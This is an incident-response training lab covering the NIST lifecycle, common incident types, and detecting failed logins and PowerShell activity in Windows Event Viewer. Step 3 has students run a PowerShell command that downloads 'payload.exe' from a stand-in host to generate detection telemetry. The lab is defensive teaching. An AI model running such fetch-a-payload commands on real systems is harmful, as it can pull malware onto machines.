# **Day#11: Introduction to Incident Response**

## **Objective:**
The objective of this lab is to introduce students to the **core concepts of incident response**, familiarize them with the **incident response lifecycle**, and help them understand how basic threats on Windows systems are detected, analyzed, and responded to by SOC Analysts.

---

## **What is Incident Response?**

**Incident Response (IR)** is the structured approach to handle and manage the aftermath of a **security breach or cyberattack**, also known as an incident. It includes steps to:
- Detect the incident
- Contain the damage
- Investigate the root cause
- Recover normal operations
- Report and document findings

---

## **Incident Response Process (NIST SP 800-61 Rev. 2)**

The NIST Incident Response Lifecycle includes **4 main phases**:

| **Phase**                         | **Description**                                                                 |
|----------------------------------|---------------------------------------------------------------------------------|
| **1. Preparation**               | Establish policies, train team, and set up tools and logging mechanisms.       |
| **2. Detection and Analysis**    | Identify potential incidents using logs, alerts, and anomaly detection systems.|
| **3. Containment, Eradication, and Recovery** | Isolate threats, remove malware/artifacts, and restore systems securely.       |
| **4. Post-Incident Activity**    | Conduct lessons learned, create reports, and improve incident response plans.  |

---

## **Common Types of Incidents on Windows:**

## **Common Types of Incidents Across Platforms**

| **Platform** | **Incident Type**                             | **Description**                                                                 |
|--------------|-----------------------------------------------|---------------------------------------------------------------------------------|
| **Windows**  | Unauthorized Login Attempts                   | Multiple failed logins or brute-force via RDP or local access.                  |
|              | PowerShell-based Attacks                      | Obfuscated or encoded PowerShell commands for exploitation or lateral movement. |
|              | Malware/Ransomware Execution                  | Malicious EXE/DLL files executed, causing encryption or data theft.             |
|              | Credential Dumping                            | Use of tools like Mimikatz to extract credentials from LSASS memory.            |
|              | Lateral Movement via WMI or RDP               | Internal system traversal using Windows services and accounts.                  |
| **Linux**    | SSH Brute Force or Unauthorized Access        | Repeated login attempts or access from unknown IPs via SSH.                     |
|              | Malicious Cron Jobs for Persistence           | Scheduled tasks created by attackers to maintain access.                        |
|              | Sudo Abuse / Privilege Escalation             | Exploiting weak sudo rules or known vulnerabilities to gain root privileges.    |
|              | Web Shell Upload                              | Attackers upload backdoors via vulnerable web applications.                     |
|              | Crypto Miner Installation                     | Hidden mining software running under compromised user accounts.                 |
| **AWS**      | IAM Credential Misuse                         | Leaked API keys used from unknown geographies.                                  |
|              | Root User Console Access                      | Suspicious login or activity from the AWS root account.                         |
|              | Unusual S3 Bucket Access                      | Public or unauthorized access to private storage.                               |
|              | CloudTrail or Logging Disabled                | Logging service turned off to hide attacker activity.                           |
|              | EC2 Abuse for Command and Control             | EC2 instances being used as a staging point or C2 server.                       |
| **Network**  | DDoS Attack                                   | Flood of traffic targeting public-facing services.                              |
|              | Port Scanning / Reconnaissance                | Continuous scanning of open ports across network segments.                      |
|              | ARP Spoofing / Man-in-the-Middle (MitM)       | Tampering with traffic flows for interception.                                  |
|              | DNS Tunneling                                 | Covert data exfiltration using DNS queries.                                     |
|              | Unauthorized VPN Access                       | Compromised VPN credentials used for internal access.                           |
| **Email**    | Phishing / Credential Harvesting              | Fake emails with links to steal user credentials.                               |
|              | Malware via Attachments                       | Office or ZIP files with embedded malware.                                      |
|              | Business Email Compromise (BEC)               | Attacker impersonates an executive to trick employees.                          |
|              | Spoofed Email Domains                         | Sending emails from domains that look like legitimate ones.                     |
|              | Internal Account Compromise                   | Compromised internal mailbox used to spread phishing internally.                |


---

## **How SOC Analysts Respond to Incidents:**
- Monitor logs and alerts (via SIEM)
- Investigate suspicious behavior
- Contain and isolate infected systems
- Coordinate with other teams
- Document and report the incident

---

## **Lab Task: Simulating and Responding to Unauthorized Access**

## **Lab Setup**

### **Requirements:**
- **System:** Windows 10/11 or Windows Server 2019/2022
- **Tools:**
  - **Windows Event Viewer**
  - **PowerShell (Pre-installed)**
  - **Task Manager / Process Explorer**
  - **Sysinternals Tools (optional)**

---

## **Preparation:**

Before diving into the lab, ensure the system is logging essential security-related events and the environment is prepared for simulating a basic security incident.

### **Enable Audit Logging:**
1. Open **Local Security Policy** (`secpol.msc`).
2. Navigate to:  
   `Advanced Audit Policy Configuration → Audit Policies → Logon/Logoff`.
3. Enable:
   - **Audit Logon Events** (Success, Failure)
   - **Audit Process Creation**

4. Use Group Policy or Registry to enable:
   - **Script Block Logging** for PowerShell
   - **Module Logging**

---


### **Step 1: Simulate a Failed Login Attempt**
1. On the Windows machine, **lock the system** (`Win + L`).
2. Attempt to log in with an **invalid password** 2–3 times.

### **Step 2: Detect the Incident Using Event Viewer**
1. Open **Event Viewer**.
2. Navigate to:  
   `Windows Logs → Security`
3. Click on **Filter Current Log**, filter by **Event ID 4625** (failed logon).
4. Locate the log entry showing the failed login attempt.
5. Note down:
   - Account Name used
   - Source IP (if any)
   - Logon Type

---

### **Step 3: Simulate a Suspicious PowerShell Command**
Run this from an **elevated PowerShell** session:

```powershell
Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
```
This mimics downloading a suspicious file.

### Step 4: Detect the PowerShell Activity
1. Open Event Viewer.
2. Navigate to:
`Applications and Services Logs → Microsoft → Windows → PowerShell → Operational`
3. Filter by Event ID 4104.
4. Identify the PowerShell command used.

### Step 5: Basic Response Actions
- Kill the suspicious process from Task Manager.
- Delete the file payload.exe from %TEMP%.
- Take note of timestamps, user account, and command line parameters.

## Conclusion:
- You learned the basic steps of detecting and responding to two common incidents: failed logins and suspicious PowerShell activity.
- Incident response involves quick detection, containment, and investigation using built-in tools like Event Viewer and PowerShell logs.
- Even basic Windows environments can generate rich telemetry for incident detection.

## Submission:
Submit two screenshots:
- One showing Event ID 4625 for the failed login attempt.
- One showing PowerShell Event ID 4104 for the download attempt.

